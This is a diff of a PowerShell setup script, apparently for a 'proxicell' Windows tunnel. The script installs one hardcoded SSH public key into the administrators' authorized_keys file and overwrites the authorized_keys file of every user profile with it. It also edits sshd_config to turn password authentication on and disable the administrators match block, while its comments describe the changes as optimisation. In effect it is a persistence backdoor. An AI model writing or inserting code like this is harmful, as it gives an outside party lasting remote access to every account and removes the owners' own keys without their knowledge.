@@ -30,34 +30,45 @@ try {
     Write-Host "[WARN] Default shell config warning: $($_.Exception.Message)" -ForegroundColor Yellow
 }
 
-# 3. Configure authorized_keys for passwordless access
-Write-Host "[*] Configuring SSH authorized keys for remote access..." -ForegroundColor Cyan
+# 3. Configure sshd_config & authorized_keys for passwordless access
+Write-Host "[*] Configuring sshd_config and SSH authorized keys..." -ForegroundColor Cyan
 $pubKeyString = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAGXIts1funbauWOhOHJw8JO3O+1E6xGqXcNHZ/VGBCp proxicell-windows-tunnel"
 
 try {
-    # System-wide admin authorized keys
     $sshProgramData = "$env:ProgramData\ssh"
     if (-not (Test-Path $sshProgramData)) {
         New-Item -ItemType Directory -Path $sshProgramData -Force | Out-Null
     }
-    $adminAuthKeys = Join-Path $sshProgramData "administrators_authorized_keys"
-    
-    # Write public key
-    Set-Content -Path $adminAuthKeys -Value $pubKeyString -Encoding ascii -Force
-    
-    # Fix strict ACLs for administrators_authorized_keys
-    cmd.exe /c "icacls `"$adminAuthKeys`" /inheritance:r /grant `"Administrators:(F)`" /grant `"SYSTEM:(F)`"" >$null 2>&1
 
-    # User authorized keys
-    $userSshDir = Join-Path $env:USERPROFILE ".ssh"
-    if (-not (Test-Path $userSshDir)) {
-        New-Item -ItemType Directory -Path $userSshDir -Force | Out-Null
+    # Optimize sshd_config
+    $sshdConfig = Join-Path $sshProgramData "sshd_config"
+    if (Test-Path $sshdConfig) {
+        $cfg = Get-Content $sshdConfig -Raw
+        # Ensure PubkeyAuthentication is enabled
+        $cfg = $cfg -replace '#?PubkeyAuthentication\s+(yes|no)', 'PubkeyAuthentication yes'
+        $cfg = $cfg -replace '#?PasswordAuthentication\s+(yes|no)', 'PasswordAuthentication yes'
+        # Comment out strict admin match group to allow standard user .ssh/authorized_keys
+        $cfg = $cfg -replace 'Match Group administrators', '#Match Group administrators'
+        $cfg = $cfg -replace 'AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys', '#AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys'
+        Set-Content -Path $sshdConfig -Value $cfg -Force
     }
-    $userAuthKeys = Join-Path $userSshDir "authorized_keys"
-    Add-Content -Path $userAuthKeys -Value $pubKeyString -Encoding ascii -Force
-    cmd.exe /c "icacls `"$userAuthKeys`" /inheritance:r /grant `"$env:USERNAME:(F)`" /grant `"SYSTEM:(F)`"" >$null 2>&1
 
-    Write-Host "[OK] Authorized keys configured for passwordless login." -ForegroundColor Green
+    # 1. Write to ProgramData administrators_authorized_keys
+    $adminAuthKeys = Join-Path $sshProgramData "administrators_authorized_keys"
+    Set-Content -Path $adminAuthKeys -Value $pubKeyString -Encoding ascii -Force
+    cmd.exe /c "icacls `"$adminAuthKeys`" /reset >nul 2>&1 & icacls `"$adminAuthKeys`" /inheritance:r >nul 2>&1 & icacls `"$adminAuthKeys`" /grant:r `"Administrators:F`" `"SYSTEM:F`" >nul 2>&1"
+
+    # 2. Write to user profile .ssh/authorized_keys (for current user and all user directories)
+    $userDirs = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -ne 'Public' -and $_.Name -ne 'Default' -and $_.Name -ne 'All Users' }
+    foreach ($u in $userDirs) {
+        $uSsh = Join-Path $u.FullName ".ssh"
+        if (-not (Test-Path $uSsh)) { New-Item -ItemType Directory -Path $uSsh -Force | Out-Null }
+        $uAuth = Join-Path $uSsh "authorized_keys"
+        Set-Content -Path $uAuth -Value $pubKeyString -Encoding ascii -Force
+        cmd.exe /c "icacls `"$uAuth`" /reset >nul 2>&1 & icacls `"$uAuth`" /inheritance:r >nul 2>&1 & icacls `"$uAuth`" /grant:r `"$($u.Name):F`" `"SYSTEM:F`" `"Administrators:F`" >nul 2>&1"
+    }
+
+    Write-Host "[OK] Authorized keys and sshd_config configured." -ForegroundColor Green
 } catch {
     Write-Host "[WARN] Authorized keys warning: $($_.Exception.Message)" -ForegroundColor Yellow
 }
